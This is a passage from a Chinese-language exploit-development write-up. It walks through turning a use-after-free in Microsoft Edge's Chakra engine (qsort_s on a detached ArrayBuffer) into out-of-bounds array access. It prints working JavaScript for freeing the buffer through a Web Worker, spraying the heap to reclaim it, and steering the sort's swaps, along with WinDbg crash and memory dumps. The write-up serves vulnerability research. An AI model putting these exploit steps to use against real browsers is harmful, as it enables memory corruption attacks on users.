}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">ArrayBufferDetachedState对象表示一个中间状态，其中一个ArrayBuffer对象已经被分离，不能再被使用，但是其原始内存尚未被释放。这里非常有趣的是ArrayBufferDetachedState对象含有一个指向用于释放分离的ArrayBuffer的原始内存的函数的指针。如上所示，如果IsValidVirtualBufferLength（）返回true，则使用Js :: JavascriptArrayBuffer :: FreeMemAlloc（它只是VirtualFree的包装器）; 否则使用free。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ArrayBuffer的原始内存的实际释放会发生在以下调用堆栈中。Project Zero提供的PoC并不会立即执行这个动作，而是在所有的JS代码运行完毕后才会被触发这个操作。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">Js::TransferablesHolder::Release
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v
Js::DetachedStateBase::CleanUp
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v
Js::ArrayBuffer::ArrayBufferDetachedState&lt;void&nbsp;(void&nbsp;*)&gt;::DiscardState(void)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v
free(),&nbsp;or&nbsp;Js::JavascriptArrayBuffer::FreeMemAlloc&nbsp;(this&nbsp;last&nbsp;one&nbsp;is&nbsp;just&nbsp;a&nbsp;wrapper&nbsp;for&nbsp;VirtualFree)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">所以，我需要找到一种方式，使分离的ArrayBuffer的原始内存可以立即释放，然后返回到qsort_s。我决定尝试使用Web Worker，我曾经在Internet Explorer的利用代码中使用了类似的漏洞，同时等待几秒钟，以便为释放原始缓冲区提供一些时间。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">function&nbsp;v(){
&nbsp;&nbsp;&nbsp;&nbsp;[...]
&nbsp;&nbsp;&nbsp;&nbsp;the_worker&nbsp;=&nbsp;new&nbsp;Worker(&#39;the_worker.js&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;the_worker.onmessage&nbsp;=&nbsp;function(evt)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(&quot;worker.onmessage:&nbsp;&quot;&nbsp;+&nbsp;evt.toString());
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;//Neuter&nbsp;the&nbsp;ArrayBuffer
&nbsp;&nbsp;&nbsp;&nbsp;the_worker.postMessage(ab,&nbsp;[ab]);
&nbsp;&nbsp;&nbsp;&nbsp;//Force&nbsp;the&nbsp;underlying&nbsp;raw&nbsp;buffer&nbsp;to&nbsp;be&nbsp;freed&nbsp;before&nbsp;returning!
&nbsp;&nbsp;&nbsp;&nbsp;the_worker.terminate();
&nbsp;&nbsp;&nbsp;&nbsp;the_worker&nbsp;=&nbsp;null;
&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Give&nbsp;some&nbsp;time&nbsp;for&nbsp;the&nbsp;raw&nbsp;buffer&nbsp;to&nbsp;be&nbsp;effectively&nbsp;freed&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;start&nbsp;=&nbsp;Date.now();
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(Date.now()&nbsp;-&nbsp;start&nbsp;&lt;&nbsp;2000){
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;[...]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我试验了这个想法，为microsoftedgecp.exe启用了全页堆验证，结果立即发生了崩溃。正如你所看到的，当交换操作尝试在释放的缓冲区上运行时，在qsort_s内部发生了崩溃：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">(b0.adc):&nbsp;Access&nbsp;violation&nbsp;-&nbsp;code&nbsp;c0000005&nbsp;(!!!&nbsp;second&nbsp;chance&nbsp;!!!)
msvcrt!qsort_s+0x3f0:
00007ff8`139000e0&nbsp;0fb608&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movzx&nbsp;&nbsp;&nbsp;ecx,byte&nbsp;ptr&nbsp;[rax]&nbsp;ds:00000282`b790aff4=??
0:010&gt;&nbsp;r
rax=00000282b790aff4&nbsp;rbx=000000ff4f1fbeb0&nbsp;rcx=000000ff4f1fbf68
rdx=00007ffff8aa4dbb&nbsp;rsi=0000000000000002&nbsp;rdi=000000ff4f1fb9c0
rip=00007ff8139000e0&nbsp;rsp=000000ff4f1fc0f0&nbsp;rbp=0000000000000004
&nbsp;r8=0000000000000004&nbsp;&nbsp;r9=00010000ffffffff&nbsp;r10=00000282b30c5170
r11=000000ff4f1fb758&nbsp;r12=00007ffff8ccaed0&nbsp;r13=00000282b790aff4
r14=00000282b790aff0&nbsp;r15=000000ff4f1fc608
iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;ng&nbsp;nz&nbsp;ac&nbsp;po&nbsp;cy
cs=0033&nbsp;&nbsp;ss=002b&nbsp;&nbsp;ds=002b&nbsp;&nbsp;es=002b&nbsp;&nbsp;fs=0053&nbsp;&nbsp;gs=002b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00010295
！heap&nbsp;-p&nbsp;-a&nbsp;@rax命令表明缓冲区已经从Js&nbsp;::&nbsp;ArrayBuffer&nbsp;::&nbsp;ArrayBufferDetachedState&nbsp;::&nbsp;DiscardState中释放：&nbsp;
0:010&gt;&nbsp;!heap&nbsp;-p&nbsp;-a&nbsp;@rax
ReadMemory&nbsp;error&nbsp;for&nbsp;address&nbsp;0000027aa4a4ffe8
Use&nbsp;`!address&nbsp;0000027aa4a4ffe8&#39;&nbsp;to&nbsp;check&nbsp;validity&nbsp;of&nbsp;the&nbsp;address.
ReadMemory&nbsp;error&nbsp;for&nbsp;address&nbsp;0000027aa4dbffe8
Use&nbsp;`!address&nbsp;0000027aa4dbffe8&#39;&nbsp;to&nbsp;check&nbsp;validity&nbsp;of&nbsp;the&nbsp;address.
&nbsp;&nbsp;&nbsp;&nbsp;address&nbsp;00000282b790aff4&nbsp;found&nbsp;in
&nbsp;&nbsp;&nbsp;&nbsp;_DPH_HEAP_ROOT&nbsp;@&nbsp;27aa4dd1000
&nbsp;&nbsp;&nbsp;&nbsp;in&nbsp;free-ed&nbsp;allocation&nbsp;(&nbsp;&nbsp;DPH_HEAP_BLOCK:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtAddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VirtSize)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;27aa4e2cc98:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;282b790a000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2000
&nbsp;&nbsp;&nbsp;&nbsp;00007ff81413ed6b&nbsp;ntdll!RtlDebugFreeHeap+0x000000000003c49b
&nbsp;&nbsp;&nbsp;&nbsp;00007ff81412cfb3&nbsp;ntdll!RtlpFreeHeap+0x000000000007f0d3
&nbsp;&nbsp;&nbsp;&nbsp;00007ff8140ac214&nbsp;ntdll!RtlFreeHeap+0x0000000000000104
&nbsp;&nbsp;&nbsp;&nbsp;00007ff8138e9dac&nbsp;msvcrt!free+0x000000000000001c
&nbsp;&nbsp;&nbsp;&nbsp;00007ffff8cc91b2&nbsp;chakra!Js::ArrayBuffer::ArrayBufferDetachedState&lt;void&nbsp;__cdecl(void&nbsp;*&nbsp;__ptr64)&gt;::DiscardState+0x0000000000000022
&nbsp;&nbsp;&nbsp;&nbsp;00007ffff8b23701&nbsp;chakra!Js::DetachedStateBase::CleanUp+0x0000000000000025
&nbsp;&nbsp;&nbsp;&nbsp;00007ffff8b27285&nbsp;chakra!Js::TransferablesHolder::Release+0x0000000000000045
&nbsp;&nbsp;&nbsp;&nbsp;00007ffff9012d86&nbsp;edgehtml!CStrongReferenceTraits::Release&lt;Windows::Foundation::IAsyncOperation&lt;unsigned&nbsp;int&gt;&nbsp;&gt;+0x0000000000000016
&nbsp;&nbsp;&nbsp;&nbsp;[...]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">回收释放的内存</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">到目前为止，我们已经满足了一个典型的UAF条件；现在，在完成释放操作之后，我们要回收释放的内存，并在此之前放置一些有用的对象，然后通过qsort_s访问释放的缓冲区以进行交换操作。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在寻找对象来填补内存空隙时，我注意到一些非常有趣的东西。保存ArrayBuffer元素的原始缓冲区（即释放后被访问的原始缓冲区）是在ArrayBuffer构造函数[lib / Runtime / Library / ArrayBuffer.cpp]中分配的：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">ArrayBuffer::ArrayBuffer(uint32&nbsp;length,&nbsp;DynamicType&nbsp;*&nbsp;type,&nbsp;Allocator&nbsp;allocator)&nbsp;:
&nbsp;&nbsp;&nbsp;&nbsp;ArrayBufferBase(type),&nbsp;mIsAsmJsBuffer(false),&nbsp;isBufferCleared(false),isDetached(false)
{
&nbsp;&nbsp;&nbsp;&nbsp;buffer&nbsp;=&nbsp;nullptr;
&nbsp;&nbsp;&nbsp;&nbsp;[...]
&nbsp;&nbsp;&nbsp;&nbsp;buffer&nbsp;=&nbsp;(BYTE*)allocator(length);
&nbsp;&nbsp;&nbsp;&nbsp;[...]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">请注意，构造函数的第三个参数是一个函数指针（Allocator类型），通过调用它来分配原始缓冲区。如果我们搜索调用这个构造函数的代码，我们会发现，它是通过下列方式从JavascriptArrayBuffer构造函数中进行调用的：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">JavascriptArrayBuffer::JavascriptArrayBuffer(uint32&nbsp;length,&nbsp;DynamicType&nbsp;*&nbsp;type)&nbsp;:
&nbsp;&nbsp;&nbsp;&nbsp;ArrayBuffer(length,&nbsp;type,&nbsp;(IsValidVirtualBufferLength(length))&nbsp;?&nbsp;AllocWrapper&nbsp;:&nbsp;malloc)
{
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">因此，JavascriptArrayBuffer构造函数可以使用两个不同的分配器调用ArrayBuffer构造函数：AllocWrapper（它是VirtualAlloc的包装器）或malloc。选择哪一个具体取决于IsValidVirtualBufferLength方法返回的布尔结果（并且该bool值是由要实例化的ArrayBuffer的长度确定的，所以我们具有完全控制权）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这意味着，与许多其他UAF场景不同，我们可以选择在哪个堆中分配目标缓冲区：由VirtualAlloc / VirtualFree管理的全页，或者在使用malloc作为分配器的情况下的CRT堆。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">根据Moretz Jodeit去年发表的研究[6]，在Internet Explorer 11上，当从JavaScript分配大量数组时，jCript9！LargeHeapBlock对象被分配在CRT堆上，它们构成了内存破坏的一个很好的靶子。但是，在MS Edge上情况并非如此，因为LargeHeapBlock对象现在通过HeapAlloc（）分配给另一个堆。在Edge中通过malloc分配的CRT堆中很难找到其他有用的对象，所以我决定寻找由VirtualAlloc分配的有用对象。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">数组</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">因此，如上所述，为了使ArrayBuffer构造函数通过VirtualAlloc分配其原始缓冲区，我们需要让IsValidVirtualBufferLength方法返回true。我们来看看它的相关代码[lib / Runtime / Library / ArrayBuffer.cpp]：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">bool&nbsp;JavascriptArrayBuffer::IsValidVirtualBufferLength(uint&nbsp;length)
{
#if&nbsp;_WIN64
&nbsp;&nbsp;&nbsp;&nbsp;/*
&nbsp;&nbsp;&nbsp;&nbsp;1.&nbsp;length&nbsp;&gt;=&nbsp;2^16
&nbsp;&nbsp;&nbsp;&nbsp;2.&nbsp;length&nbsp;is&nbsp;power&nbsp;of&nbsp;2&nbsp;or&nbsp;(length&nbsp;&gt;&nbsp;2^24&nbsp;and&nbsp;length&nbsp;is&nbsp;multiple&nbsp;of&nbsp;2^24)
&nbsp;&nbsp;&nbsp;&nbsp;3.&nbsp;length&nbsp;is&nbsp;a&nbsp;multiple&nbsp;of&nbsp;4K
&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(!PHASE_OFF1(Js::TypedArrayVirtualPhase)&nbsp;&amp;&amp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(length&nbsp;&gt;=&nbsp;0x10000)&nbsp;&amp;&amp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(((length&nbsp;&amp;&nbsp;(~length&nbsp;+&nbsp;1))&nbsp;==&nbsp;length)&nbsp;||
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(length&nbsp;&gt;=&nbsp;0x1000000&nbsp;&amp;&amp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;((length&nbsp;&amp;&nbsp;0xFFFFFF)&nbsp;==&nbsp;0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)&nbsp;&amp;&amp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;((length&nbsp;%&nbsp;AutoSystemInfo::PageSize)&nbsp;==&nbsp;0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);
#else
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;false;
#endif
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这意味着，我们可以通过指定例如0x10000作为我们正在创建的ArrayBuffer的长度来使其返回true。这样，将在释放之后使用的缓冲区就会通过VirtualAlloc进行分配。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">考虑到重新分配操作，我注意到，当从JavaScript代码分配大整数数组时，数组也是通过VirtualAlloc分配的。为此，我在WinDbg中使用了如下所示这样的记录断点：&nbsp;</span></p><pre class="brush:plain;toolbar:false">&gt;&nbsp;bp&nbsp;kernelbase!VirtualAlloc&nbsp;&quot;k&nbsp;5;r&nbsp;@$t3=@rdx;gu;r&nbsp;@$t4=@rax;.printf&nbsp;\&quot;Allocated&nbsp;0x%x&nbsp;bytes&nbsp;@&nbsp;address&nbsp;%p\\n\&quot;,&nbsp;@$t3,&nbsp;@$t4;gu;dqs&nbsp;@$t4&nbsp;l4;gc&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">输出结果如下所示：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;#&nbsp;Child-SP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RetAddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Call&nbsp;Site
00&nbsp;000000d0`f51fb3f8&nbsp;00007ffc`3a932f11&nbsp;KERNELBASE!VirtualAlloc
01&nbsp;000000d0`f51fb400&nbsp;00007ffc`255fa5f5&nbsp;EShims!NS_ACGLockdownTelemetry::APIHook_VirtualAlloc+0x51
02&nbsp;000000d0`f51fb450&nbsp;00007ffc`255fdc4b&nbsp;chakra!Memory::VirtualAllocWrapper::Alloc+0x55
03&nbsp;000000d0`f51fb4b0&nbsp;00007ffc`2565bc38&nbsp;chakra!Memory::SegmentBase&lt;Memory::VirtualAllocWrapper&gt;::Initialize+0xab
04&nbsp;000000d0`f51fb510&nbsp;00007ffc`255fc8e2&nbsp;chakra!Memory::PageAllocatorBase&lt;Memory::VirtualAllocWrapper&gt;::AllocPageSegment+0x9c
Allocated&nbsp;0x10000&nbsp;bytes&nbsp;@&nbsp;address&nbsp;000002d0909a0000
000002d0`909a0000&nbsp;&nbsp;00000000`00000000
000002d0`909a0008&nbsp;&nbsp;00000000`00000000
000002d0`909a0010&nbsp;&nbsp;00000000`00000000
000002d0`909a0018&nbsp;&nbsp;00000000`00000000</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">检查内存的内容后会显示一个数组的结构：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0:025&gt;&nbsp;dds&nbsp;000002d0909a0000
000002d0`909a0000&nbsp;&nbsp;00000000
000002d0`909a0004&nbsp;&nbsp;00000000
000002d0`909a0008&nbsp;&nbsp;0000ffe0
000002d0`909a000c&nbsp;&nbsp;00000000
000002d0`909a0010&nbsp;&nbsp;00000000
000002d0`909a0014&nbsp;&nbsp;00000000
000002d0`909a0018&nbsp;&nbsp;0000ce7c
000002d0`909a001c&nbsp;&nbsp;00000000
000002d0`909a0020&nbsp;&nbsp;00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&lt;---&nbsp;Js::SparseArraySegment&nbsp;object&nbsp;starts&nbsp;here
000002d0`909a0024&nbsp;&nbsp;00003ff2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;array&nbsp;length
000002d0`909a0028&nbsp;&nbsp;00003ff2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;array&nbsp;reserved&nbsp;capacity
000002d0`909a002c&nbsp;&nbsp;00000000
000002d0`909a0030&nbsp;&nbsp;00000000
000002d0`909a0034&nbsp;&nbsp;00000000
000002d0`909a0038&nbsp;&nbsp;41414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//array&nbsp;elements
000002d0`909a003c&nbsp;&nbsp;41414141
000002d0`909a0040&nbsp;&nbsp;41414141</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在该内存转储的偏移量0x20处，我们有一个Js :: SparseArraySegment类的实例，它会被JavascriptNativeIntArray对象的head成员引用：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0000029c`73ea82c0&nbsp;&nbsp;00007ffc`259b38d8&nbsp;&nbsp;&nbsp;&nbsp;chakra!Js::JavascriptNativeIntArray::`vftable&#39;
0000029c`73ea82c8&nbsp;&nbsp;0000029b`725590c0&nbsp;&nbsp;&nbsp;&nbsp;//Pointer&nbsp;to&nbsp;type&nbsp;information
0000029c`73ea82d0&nbsp;&nbsp;00000000`00000000
0000029c`73ea82d8&nbsp;&nbsp;00000000`00010005
0000029c`73ea82e0&nbsp;&nbsp;00000000`00003ff2&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;array&nbsp;length
0000029c`73ea82e8&nbsp;&nbsp;000002d0`909a0020&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&lt;---&nbsp;&#39;head&#39;&nbsp;member,&nbsp;points&nbsp;to&nbsp;Js::SparseArraySegment&nbsp;object</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在Js :: SparseArraySegment对象的偏移量0x8处，我们可以看到整数数组的备用容量，数组的元素从偏移量0x18开始。由于UAF漏洞允许我们在qsort_s决定交换两个元素的顺序时交换两个双字，我们将尝试利用这一点，通过（由我们完全控制）的数组元素来替换备用容量。如果我们设法做到了这一点，我们就能够读写数组以外的内存。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">顺便说一句，我的reclaim函数（在分离ArrayBuffer之后，在从v()返回之前调用）函数看起来就像是这样的。注意，我从0x10000减去0x38（数组元素从缓冲区开始的偏移量），然后将其除以4（每个元素的大小），因此分配大小正好是0x10000。该喷射操作具有附加的特性，即所分配的块彼此相邻，之间没有间隙，这对我们后面的工作非常有用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">function&nbsp;reclaim(){
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;NUMBER_ARRAYS&nbsp;=&nbsp;20000;
&nbsp;&nbsp;&nbsp;&nbsp;arr&nbsp;=&nbsp;new&nbsp;Array(NUMBER_ARRAYS);
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(var&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;NUMBER_ARRAYS;&nbsp;i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Allocate&nbsp;an&nbsp;array&nbsp;of&nbsp;integers&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arr[i]&nbsp;=&nbsp;new&nbsp;Array((0x10000-0x38)/4);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(var&nbsp;j&nbsp;=&nbsp;0;&nbsp;j&nbsp;&lt;&nbsp;arr[i].length;&nbsp;j++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arr[i][j]&nbsp;=&nbsp;0x41414141;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">有趣的是，如果由于某种原因，你尝试一下大于0x10000的喷射块，同时仍然进行IsValidVirtualBufferLength检查的话，那么很快就会注意到，在具有很多重复元素的数组上运行quicksort算法时到底有多慢[7] :)所以最好坚持使用0x10000，这是IsValidVirtualBufferLength返回true的最小长度，除非你希望你的漏洞要运行许多分钟。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">影响Quicksort并控制交换操作</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在，您可能想要了解quicksort算法的工作原理[8]，并查看其具体实现[9]。请注意，为了使qsort_s根据我们的需要进行精确的元素交换（用offset&gt; = 0x38的数组元素替换缓冲区中偏移量为0x28处的整数数组备用容量），我们必须仔细地构造：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">存储在ArrayBuffer中将要进行排序的值</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">这些值在ArrayBuffer中的位置</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">我们的JS比较函数返回的值（-1，0，1）[10]</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">做了一些测试后，我找到了下面的ArrayBuffer设置，这将触发我需要的精确交换操作：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">var&nbsp;ab&nbsp;=&nbsp;new&nbsp;ArrayBuffer(0x10000);
var&nbsp;ia&nbsp;=&nbsp;new&nbsp;Int32Array(ab);
[...]
ia[0x0a]&nbsp;=&nbsp;0x9;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Array&nbsp;capacity,&nbsp;gets&nbsp;swapped&nbsp;(offset&nbsp;0x28&nbsp;of&nbsp;the&nbsp;buffer)
ia[0x13]&nbsp;=&nbsp;0x55555555;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;gets&nbsp;swapped&nbsp;(offset&nbsp;0x4C&nbsp;of&nbsp;the&nbsp;buffer,&nbsp;element&nbsp;at&nbsp;index&nbsp;5&nbsp;of&nbsp;the&nbsp;int&nbsp;array)
ia[0x20]&nbsp;=&nbsp;0x66666666;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">使用这种设置，当比较的元素是我要交换的两个值时，我的比较函数将触发UAF漏洞：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">[...]
if&nbsp;((this.a&nbsp;==&nbsp;0x9)&nbsp;&amp;&amp;&nbsp;(this.b&nbsp;==&nbsp;0x55555555)){
&nbsp;&nbsp;&nbsp;&nbsp;//Let&#39;s&nbsp;detach&nbsp;the&nbsp;&#39;ab&#39;&nbsp;ArrayBuffer
&nbsp;&nbsp;&nbsp;&nbsp;the_worker&nbsp;=&nbsp;new&nbsp;Worker(&#39;the_worker.js&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;the_worker.onmessage&nbsp;=&nbsp;function(evt)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(&quot;worker.onmessage:&nbsp;&quot;&nbsp;+&nbsp;evt.toString());
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;the_worker.postMessage(ab,&nbsp;[ab]);
&nbsp;&nbsp;&nbsp;&nbsp;//Force&nbsp;the&nbsp;underlying&nbsp;raw&nbsp;buffer&nbsp;to&nbsp;be&nbsp;freed&nbsp;before&nbsp;returning!
